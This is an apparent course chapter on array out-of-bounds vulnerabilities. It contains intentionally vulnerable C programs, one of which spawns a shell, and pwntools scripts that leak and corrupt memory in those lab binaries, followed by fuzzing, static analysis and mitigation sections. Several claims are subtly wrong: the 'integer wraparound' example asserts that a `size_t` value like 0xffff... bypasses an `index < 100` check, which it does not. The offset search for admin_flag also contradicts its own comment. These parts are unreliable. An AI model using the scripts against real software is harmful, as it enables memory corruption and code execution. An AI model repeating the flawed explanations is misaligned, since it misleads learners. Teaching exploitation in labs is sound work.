# Array Indexing Vulnerabilities

Array indexing vulnerabilities, also known as out-of-bounds access vulnerabilities, occur when programs access array elements beyond their allocated boundaries. These can lead to information disclosure, memory corruption, and arbitrary code execution.

## Understanding Array Bounds

### Array Memory Layout

```c
Array Memory Layout:
┌─────────────────────┐
│  array[-2]          │ ← Out of bounds (negative)
├─────────────────────┤
│  array[-1]          │ ← Out of bounds (negative)  
├─────────────────────┤
│  array[0]           │ ← Valid range starts
├─────────────────────┤
│  array[1]           │ ← Valid elements
├─────────────────────┤
│  ...                │
├─────────────────────┤
│  array[size-1]      │ ← Valid range ends
├─────────────────────┤
│  array[size]        │ ← Out of bounds (positive)
├─────────────────────┤
│  array[size+1]      │ ← Out of bounds (positive)
└─────────────────────┘
```

### Types of Array Indexing Vulnerabilities

1. **Positive overflow** - Index >= array_size
2. **Negative underflow** - Index < 0
3. **Off-by-one errors** - Index == array_size
4. **Integer wraparound** - Large unsigned values becoming negative

## Vulnerable Code Examples

### Basic Out-of-Bounds Access

```c
// vuln_array.c
#include <stdio.h>
#include <stdlib.h>

int data[10] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10};
int secret = 0xdeadbeef;

void print_array_element(int index) {
    printf("data[%d] = %d\n", index, data[index]);  // VULNERABLE
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <index>\n", argv[0]);
        return 1;
    }
    
    int index = atoi(argv[1]);
    print_array_element(index);
    
    return 0;
}
```

**Test:**
```bash
gcc -o vuln_array vuln_array.c
./vuln_array 0     # Valid: prints data[0]
./vuln_array 10    # Invalid: out of bounds
./vuln_array -1    # Invalid: negative index
./vuln_array 11    # May access 'secret' variable
```

### Buffer Write with Index Control

```c
// vuln_write.c
#include <stdio.h>
#include <stdlib.h>

char buffer[100];
char admin_flag = 0;

void write_to_buffer(int index, char value) {
    if (index >= 100) {
        printf("Index too large!\n");
        return;
    }
    
    // VULNERABLE: Missing check for negative indices
    buffer[index] = value;
    printf("buffer[%d] = %c\n", index, value);
}

void check_admin() {
    if (admin_flag) {
        printf("Admin access granted!\n");
        system("/bin/sh");
    } else {
        printf("Access denied.\n");
    }
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("Usage: %s <index> <value>\n", argv[0]);
        return 1;
    }
    
    int index = atoi(argv[1]);
    char value = argv[2][0];
    
    write_to_buffer(index, value);
    check_admin();
    
    return 0;
}
```

### Dynamic Array Vulnerability

```c
// vuln_dynamic.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
    int *data;
    size_t size;
    size_t capacity;
} dynamic_array;

dynamic_array* create_array(size_t initial_capacity) {
    dynamic_array *arr = malloc(sizeof(dynamic_array));
    arr->data = malloc(initial_capacity * sizeof(int));
    arr->size = 0;
    arr->capacity = initial_capacity;
    return arr;
}

int get_element(dynamic_array *arr, size_t index) {
    // VULNERABLE: No bounds checking
    return arr->data[index];
}

void set_element(dynamic_array *arr, size_t index, int value) {
    // VULNERABLE: No bounds checking
    arr->data[index] = value;
}

int main() {
    dynamic_array *arr = create_array(10);
    
    // Add some elements
    for (int i = 0; i < 5; i++) {
        set_element(arr, i, i * 10);
    }
    
    // User-controlled access
    printf("Enter index: ");
    size_t index;
    scanf("%zu", &index);
    
    printf("Element at %zu: %d\n", index, get_element(arr, index));
    
    return 0;
}
```

## Exploitation Techniques

### Information Disclosure

```python
#!/usr/bin/env python3
from pwn import *

def probe_memory_layout():
    """Probe memory layout using out-of-bounds reads"""
    
    print("Probing memory layout:")
    
    for index in range(-10, 20):
        try:
            p = process(['./vuln_array', str(index)])
            output = p.recvall(timeout=1)
            
            if b'data[' in output:
                value = output.split(b'= ')[1].strip()
                print(f"Index {index:3d}: {value.decode()}")
            
            p.close()
        except:
            continue

def leak_adjacent_variables():
    """Leak variables adjacent to array"""
    
    # Try different indices to find interesting values
    interesting_indices = []
    
    for index in range(10, 50):  # Beyond array bounds
        try:
            p = process(['./vuln_array', str(index)])
            output = p.recvall(timeout=1)
            
            if b'data[' in output:
                value_str = output.split(b'= ')[1].strip().decode()
                value = int(value_str)
                
                # Look for interesting patterns (pointers, magic values, etc.)
                if value > 0x1000 or value < -1000 or hex(value).count('dead') > 0:
                    interesting_indices.append((index, value))
                    print(f"Interesting value at index {index}: {hex(value)}")
            
            p.close()
        except:
            continue
    
    return interesting_indices

def negative_index_probing():
    """Probe negative indices to access stack/heap data"""
    
    print("Probing negative indices:")
    
    for index in range(-50, 0):
        try:
            p = process(['./vuln_array', str(index)])
            output = p.recvall(timeout=1)
            
            if b'data[' in output and b'Segmentation' not in output:
                value_str = output.split(b'= ')[1].strip().decode()
                print(f"Index {index}: {value_str}")
            
            p.close()
        except:
            continue

probe_memory_layout()
```

### Memory Corruption via Write

```python
#!/usr/bin/env python3
from pwn import *

def corrupt_adjacent_variable():
    """Corrupt variables adjacent to array"""
    
    # Try to find the offset to admin_flag
    # admin_flag is likely right after buffer[100]
    
    # Test different negative offsets
    for offset in range(-200, -50):
        try:
            p = process(['./vuln_write', str(offset), 'X'])
            p.sendline()  # Trigger check_admin
            
            output = p.recvall(timeout=1)
            
            if b'Admin access granted' in output:
                print(f"Found admin_flag at offset {offset}!")
                print(output.decode())
                return offset
            elif b'Access denied' not in output:
                print(f"Interesting response at offset {offset}: {output}")
            
            p.close()
        except:
            continue
    
    return None

def precise_variable_overwrite():
    """Precisely overwrite the admin_flag variable"""
    
    # Assuming we found admin_flag is at offset -X from buffer
    # In the example, it might be at buffer[-1] or similar
    
    admin_flag_offset = -1  # Adjust based on binary analysis
    
    p = process(['./vuln_write', str(admin_flag_offset), '\x01'])
    p.sendline()
    
    output = p.recvall()
    print("Admin flag overwrite result:")
    print(output.decode())
    
    if b'Admin access granted' in output:
        print("Successfully corrupted admin_flag!")
        return True
    
    return False

def stack_variable_corruption():
    """Corrupt stack variables using negative indexing"""
    
    # Compile a test program that shows stack layout
    test_c = '''
#include <stdio.h>
#include <stdlib.h>

void vulnerable_function() {
    int important_var = 0x12345678;
    char buffer[10];
    int another_var = 0x87654321;
    
    printf("important_var address: %p\\n", &important_var);
    printf("buffer address: %p\\n", buffer);
    printf("another_var address: %p\\n", &another_var);
    
    // User can control index
    int index = atoi(getenv("INDEX"));
    char value = getenv("VALUE")[0];
    
    buffer[index] = value;
    
    printf("important_var: 0x%x\\n", important_var);
    printf("another_var: 0x%x\\n", another_var);
}

int main() {
    vulnerable_function();
    return 0;
}
'''
    
    # This would require compiling and testing
    print("Stack variable corruption example - compile test program to analyze")

corrupt_adjacent_variable()
```

### Heap Exploitation via Array Indexing

```python
#!/usr/bin/env python3
from pwn import *

def heap_overflow_via_indexing():
    """Exploit heap layout using out-of-bounds array access"""
    
    # Create a program that allocates multiple objects
    exploit_c = '''
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
    char data[32];
    void (*function_ptr)();
} heap_object;

void win() {
    printf("Win function called!\\n");
    system("/bin/sh");
}

void normal_function() {
    printf("Normal function called\\n");
}

int main() {
    // Allocate objects on heap
    heap_object *obj1 = malloc(sizeof(heap_object));
    heap_object *obj2 = malloc(sizeof(heap_object));
    
    strcpy(obj1->data, "First object");
    obj1->function_ptr = normal_function;
    
    strcpy(obj2->data, "Second object");
    obj2->function_ptr = normal_function;
    
    printf("obj1: %p\\n", obj1);
    printf("obj2: %p\\n", obj2);
    printf("win function: %p\\n", win);
    
    // Vulnerable array access
    int index;
    printf("Enter index: ");
    scanf("%d", &index);
    
    // VULNERABLE: Can write beyond obj1 into obj2
    obj1->data[index] = 0x41;  // Write 'A'
    
    // Call function pointer (might be corrupted)
    obj2->function_ptr();
    
    return 0;
}
'''
    
    print("Heap exploitation concept - analyze object layout")
    print("If obj2 is adjacent to obj1, can corrupt function pointer")

def use_after_free_indexing():
    """Combine array indexing with use-after-free"""
    
    exploit_c = '''
#include <stdio.h>
#include <stdlib.h>

int *global_array;

void allocate_array(size_t size) {
    global_array = malloc(size * sizeof(int));
    for (size_t i = 0; i < size; i++) {
        global_array[i] = i;
    }
}

void free_array() {
    free(global_array);
    // global_array not set to NULL - dangling pointer
}

void access_array(int index) {
    // VULNERABLE: Use after free + out of bounds
    printf("Array[%d] = %d\\n", index, global_array[index]);
}

void allocate_victim() {
    // Allocate something in the freed space
    char *victim = malloc(40);
    strcpy(victim, "VICTIM_DATA_HERE");
}

int main() {
    allocate_array(10);
    free_array();
    
    allocate_victim();  // Reuse freed memory
    
    // Now accessing the "array" accesses victim data
    access_array(0);  // May read victim data
    
    return 0;
}
'''
    
    print("Use-after-free + indexing vulnerability concept")

heap_overflow_via_indexing()
```

### Advanced Exploitation Patterns

```python
#!/usr/bin/env python3
from pwn import *

def integer_wraparound_exploit():
    """Exploit integer wraparound in array indexing"""
    
    # When size_t index wraps around
    exploit_c = '''
#include <stdio.h>
#include <stdlib.h>

void vulnerable_function(size_t index) {
    int array[100];
    
    // Check looks safe but can be bypassed with wraparound
    if (index < 100) {
        printf("Index in bounds\\n");
        array[index] = 0x41414141;
        printf("Wrote to array[%zu]\\n", index);
    } else {
        printf("Index out of bounds\\n");
    }
}

int main() {
    // These can bypass the bounds check:
    vulnerable_function(0xffffffffffffffff);  // -1 as size_t
    vulnerable_function(0xfffffffffffffffe);  // -2 as size_t
    
    return 0;
}
'''
    
    print("Integer wraparound exploit concept")
    print("size_t(-1) appears as very large positive number")
    print("But when used as signed, becomes negative index")

def multiple_arrays_confusion():
    """Exploit confusion between multiple arrays"""
    
    exploit_c = '''
#include <stdio.h>
#include <stdlib.h>

int array1[50];
int array2[50];
int secret = 0xdeadbeef;

void set_array_element(int array_num, int index, int value) {
    if (array_num == 1) {
        // VULNERABLE: No bounds check on index
        array1[index] = value;
    } else if (array_num == 2) {
        // VULNERABLE: No bounds check on index  
        array2[index] = value;
    }
}

int main() {
    // If arrays are adjacent in memory:
    // array1[50] might be array2[0]
    // array1[100] might be secret
    
    set_array_element(1, 100, 0x41414141);  // Might overwrite secret
    
    printf("Secret: 0x%x\\n", secret);
    
    return 0;
}
'''
    
    print("Multiple array confusion concept")
    print("Adjacent arrays can be confused via out-of-bounds access")

def vector_reallocation_exploit():
    """Exploit vector reallocation vulnerabilities"""
    
    exploit_c = '''
#include <stdio.h>
#include <stdlib.h>

typedef struct {
    int *data;
    size_t size;
    size_t capacity;
} vector;

vector* create_vector() {
    vector *v = malloc(sizeof(vector));
    v->capacity = 4;
    v->size = 0;
    v->data = malloc(v->capacity * sizeof(int));
    return v;
}

void push_back(vector *v, int value) {
    if (v->size >= v->capacity) {
        // Realloc - this can move the data
        v->capacity *= 2;
        v->data = realloc(v->data, v->capacity * sizeof(int));
    }
    
    v->data[v->size++] = value;
}

int* get_element_ptr(vector *v, size_t index) {
    // VULNERABLE: Returns pointer that might become invalid
    return &v->data[index];
}

int main() {
    vector *v = create_vector();
    
    push_back(v, 1);
    push_back(v, 2);
    
    int *ptr = get_element_ptr(v, 0);  // Get pointer to element
    
    // These push_backs might cause reallocation
    push_back(v, 3);
    push_back(v, 4);
    push_back(v, 5);  // Forces reallocation!
    
    // ptr is now dangling - points to freed memory
    *ptr = 0x41414141;  // Use after free
    
    return 0;
}
'''
    
    print("Vector reallocation vulnerability concept")
    print("Stored pointers become dangling after reallocation")

integer_wraparound_exploit()
```

## Detection and Analysis

### Static Analysis for Array Bounds

```python
#!/usr/bin/env python3
import re

def analyze_c_code_for_array_bugs(code):
    """Simple static analysis for array indexing bugs"""
    
    issues = []
    lines = code.split('\n')
    
    for i, line in enumerate(lines, 1):
        # Look for array access patterns
        array_access = re.findall(r'(\w+)\[([^\]]+)\]', line)
        
        for array_name, index_expr in array_access:
            # Check for obvious issues
            if 'atoi' in index_expr and 'if' not in line:
                issues.append(f"Line {i}: Unchecked user input in array index: {array_name}[{index_expr}]")
            
            if 'scanf' in index_expr and 'if' not in line:
                issues.append(f"Line {i}: Unchecked scanf input in array index: {array_name}[{index_expr}]")
            
            # Look for missing bounds checks
            if any(var in index_expr for var in ['index', 'idx', 'i']) and 'if' not in line:
                # Check if there's a bounds check nearby
                bounds_check_found = False
                for j in range(max(0, i-5), min(len(lines), i+2)):
                    if 'if' in lines[j] and ('>' in lines[j] or '<' in lines[j]):
                        bounds_check_found = True
                        break
                
                if not bounds_check_found:
                    issues.append(f"Line {i}: Possible missing bounds check for {array_name}[{index_expr}]")
    
    return issues

# Example usage
vulnerable_code = '''
int data[100];
int process_data(int index) {
    return data[index];  // No bounds check
}

void write_data(int index, int value) {
    if (index < 100) {  // Missing negative check
        data[index] = value;
    }
}

int user_access() {
    int idx = atoi(user_input);  // User input
    return data[idx];  // Unchecked
}
'''

issues = analyze_c_code_for_array_bugs(vulnerable_code)
for issue in issues:
    print(issue)
```

### Dynamic Analysis with Fuzzing

```python
#!/usr/bin/env python3
from pwn import *
import random

def fuzz_array_indexing(binary_path, iterations=1000):
    """Fuzz array indexing with various inputs"""
    
    crashes = []
    interesting_outputs = []
    
    for i in range(iterations):
        # Generate test inputs
        test_inputs = [
            str(random.randint(-1000, 1000)),           # Random index
            str(0xffffffff),                            # Large positive
            str(-1),                                    # Simple negative
            str(random.randint(-100, -1)),              # Random negative
            "2147483647",                               # INT_MAX
            "2147483648",                               # INT_MAX + 1
            "-2147483648",                              # INT_MIN
            "-2147483649",                              # INT_MIN - 1
        ]
        
        for test_input in test_inputs:
            try:
                p = process([binary_path, test_input])
                output = p.recvall(timeout=1)
                
                # Check for crashes
                if p.returncode != 0:
                    crashes.append((test_input, p.returncode, output))
                
                # Check for interesting output
                if any(keyword in output for keyword in [b'0x', b'admin', b'secret', b'flag']):
                    interesting_outputs.append((test_input, output))
                
                p.close()
                
            except Exception as e:
                crashes.append((test_input, "exception", str(e)))
    
    print(f"Fuzzing completed. Found {len(crashes)} crashes and {len(interesting_outputs)} interesting outputs")
    
    return crashes, interesting_outputs

def targeted_bounds_testing(binary_path):
    """Test specific boundary conditions"""
    
    test_cases = [
        # Boundary tests
        ("-1", "Negative index"),
        ("0", "First element"),
        ("9", "Last valid element (if array size 10)"),
        ("10", "First invalid element"),
        ("11", "Beyond bounds"),
        ("100", "Far beyond bounds"),
        
        # Integer overflow tests
        ("4294967295", "UINT_MAX"),
        ("18446744073709551615", "ULLONG_MAX"),
        ("-2147483648", "INT_MIN"),
        ("2147483647", "INT_MAX"),
        
        # Format string injection in index
        ("%x", "Hex format specifier"),
        ("%p", "Pointer format specifier"),
        ("%n", "Write format specifier"),
    ]
    
    results = []
    
    for test_input, description in test_cases:
        try:
            p = process([binary_path, test_input])
            output = p.recvall(timeout=2)
            
            results.append({
                'input': test_input,
                'description': description,
                'returncode': p.returncode,
                'output': output,
                'crashed': p.returncode != 0
            })
            
            p.close()
            
        except Exception as e:
            results.append({
                'input': test_input,
                'description': description,
                'error': str(e),
                'crashed': True
            })
    
    # Print results
    for result in results:
        status = "CRASH" if result.get('crashed') else "OK"
        print(f"[{status}] {result['description']} ('{result['input']}')")
        
        if 'output' in result and result['output']:
            print(f"  Output: {result['output'][:100]}...")
    
    return results

# Example usage
# crashes, interesting = fuzz_array_indexing('./vuln_array')
# results = targeted_bounds_testing('./vuln_array')
```

### Memory Layout Analysis

```python
#!/usr/bin/env python3
from pwn import *

def analyze_memory_layout(binary_path):
    """Analyze memory layout to understand array placement"""
    
    # Use GDB to analyze memory layout
    gdb_script = '''
set disassembly-flavor intel
break main
run
info variables
x/20wx &data
x/20wx &secret
print &data - &secret
'''
    
    print("GDB script for memory layout analysis:")
    print(gdb_script)
    
    # Automated analysis using array probing
    memory_map = {}
    
    for index in range(-50, 50):
        try:
            p = process([binary_path, str(index)])
            output = p.recvall(timeout=1)
            
            if b'data[' in output and b'= ' in output:
                value_str = output.split(b'= ')[1].strip().decode()
                try:
                    value = int(value_str)
                    memory_map[index] = value
                except:
                    memory_map[index] = value_str
            
            p.close()
            
        except:
            continue
    
    # Analyze patterns
    print("Memory layout analysis:")
    for index in sorted(memory_map.keys()):
        value = memory_map[index]
        
        if isinstance(value, int):
            if value == 0xdeadbeef:
                print(f"Index {index:3d}: 0x{value:08x} (FOUND SECRET!)")
            elif value > 0x1000:
                print(f"Index {index:3d}: 0x{value:08x} (possible pointer)")
            else:
                print(f"Index {index:3d}: {value}")
        else:
            print(f"Index {index:3d}: {value}")

def calculate_offset_to_target(binary_path, target_pattern=0xdeadbeef):
    """Calculate offset from array to target variable"""
    
    for index in range(-100, 100):
        try:
            p = process([binary_path, str(index)])
            output = p.recvall(timeout=1)
            
            if b'data[' in output and b'= ' in output:
                value_str = output.split(b'= ')[1].strip().decode()
                try:
                    value = int(value_str)
                    if value == target_pattern:
                        print(f"Target found at index {index}")
                        return index
                except:
                    pass
            
            p.close()
            
        except:
            continue
    
    print("Target not found")
    return None

# Example usage
# analyze_memory_layout('./vuln_array')
# offset = calculate_offset_to_target('./vuln_array')
```

## Mitigation and Prevention

### Secure Coding Practices

```c
// secure_array.c - Safe array access patterns

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>

#define ARRAY_SIZE 10

// Method 1: Explicit bounds checking
bool safe_get_element(int *array, size_t array_size, size_t index, int *result) {
    if (index >= array_size) {
        printf("Error: Index %zu out of bounds (size: %zu)\n", index, array_size);
        return false;
    }
    
    *result = array[index];
    return true;
}

// Method 2: Clamping indices
size_t clamp_index(size_t index, size_t array_size) {
    if (index >= array_size) {
        return array_size - 1;  // Clamp to last valid index
    }
    return index;
}

// Method 3: Using safer data structures
typedef struct {
    int *data;
    size_t size;
    size_t capacity;
} safe_array;

safe_array* create_safe_array(size_t capacity) {
    safe_array *arr = malloc(sizeof(safe_array));
    if (!arr) return NULL;
    
    arr->data = calloc(capacity, sizeof(int));
    if (!arr->data) {
        free(arr);
        return NULL;
    }
    
    arr->size = 0;
    arr->capacity = capacity;
    return arr;
}

bool safe_array_get(safe_array *arr, size_t index, int *result) {
    if (!arr || !result) return false;
    
    if (index >= arr->size) {
        printf("Error: Index %zu out of bounds (size: %zu)\n", index, arr->size);
        return false;
    }
    
    *result = arr->data[index];
    return true;
}

bool safe_array_set(safe_array *arr, size_t index, int value) {
    if (!arr) return false;
    
    if (index >= arr->capacity) {
        printf("Error: Index %zu out of bounds (capacity: %zu)\n", index, arr->capacity);
        return false;
    }
    
    arr->data[index] = value;
    if (index >= arr->size) {
        arr->size = index + 1;  // Extend logical size
    }
    
    return true;
}

// Method 4: Input validation
bool validate_user_index(const char *input, size_t array_size, size_t *result) {
    char *endptr;
    long val = strtol(input, &endptr, 10);
    
    // Check for conversion errors
    if (endptr == input || *endptr != '\0') {
        printf("Error: Invalid number format\n");
        return false;
    }
    
    // Check for negative values
    if (val < 0) {
        printf("Error: Negative index not allowed\n");
        return false;
    }
    
    // Check bounds
    if ((size_t)val >= array_size) {
        printf("Error: Index %ld out of bounds (max: %zu)\n", val, array_size - 1);
        return false;
    }
    
    *result = (size_t)val;
    return true;
}

int main() {
    int data[ARRAY_SIZE] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10};
    
    // Safe usage example
    printf("Enter index (0-%d): ", ARRAY_SIZE - 1);
    
    char input[32];
    if (fgets(input, sizeof(input), stdin)) {
        size_t index;
        if (validate_user_index(input, ARRAY_SIZE, &index)) {
            int value;
            if (safe_get_element(data, ARRAY_SIZE, index, &value)) {
                printf("data[%zu] = %d\n", index, value);
            }
        }
    }
    
    return 0;
}
```

### Compiler-Based Protections

```bash
# Enable array bounds checking (GCC)
gcc -fbounds-check -o safe_program program.c

# Enable AddressSanitizer for runtime detection
gcc -fsanitize=address -g -o asan_program program.c

# Enable stack protector
gcc -fstack-protector-strong -o protected_program program.c

# Enable all warnings
gcc -Wall -Wextra -Warray-bounds -o warned_program program.c
```

### Runtime Detection

```c
// runtime_checks.c - Runtime bounds checking

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>

// Custom bounds checking
#define SAFE_ARRAY_ACCESS(arr, size, index) \
    (((index) < (size)) ? (arr)[index] : \
     (printf("Bounds violation: index %d >= size %zu\n", (index), (size)), \
      abort(), 0))

// Signal handler for segmentation faults
void segfault_handler(int sig) {
    printf("Segmentation fault detected - possible bounds violation\n");
    abort();
}

int main() {
    // Install signal handler
    signal(SIGSEGV, segfault_handler);
    
    int data[10] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10};
    
    // Safe access
    int index = 5;
    int value = SAFE_ARRAY_ACCESS(data, 10, index);
    printf("data[%d] = %d\n", index, value);
    
    // This would trigger bounds checking
    // int bad_value = SAFE_ARRAY_ACCESS(data, 10, 15);
    
    return 0;
}
```

## Key Takeaways

!!! important "Array Indexing Fundamentals"
    - **Bounds checking is essential** - Always validate array indices
    - **Negative indices are dangerous** - Check for both positive and negative bounds
    - **Adjacent variables can be corrupted** - Out-of-bounds writes affect nearby memory
    - **Integer wraparound creates vulnerabilities** - Large unsigned values can become negative
    - **Stack and heap layout matters** - Understanding memory layout helps exploitation

!!! warning "Common Mistakes"
    - Only checking upper bounds, ignoring negative indices
    - Using signed integers for array sizes without validation
    - Trusting user input for array indices
    - Off-by-one errors in bounds checking (using <= instead of <)
    - Not considering integer overflow in index calculations

!!! tip "Secure Development Tips"
    - Always validate array indices before use
    - Use size_t for array indices and sizes
    - Implement bounds checking functions or use safe array libraries
    - Enable compiler warnings and static analysis tools
    - Use AddressSanitizer during development and testing

---

*Next: [Integer Overflow Vulnerabilities](03-integer-overflow.md)*
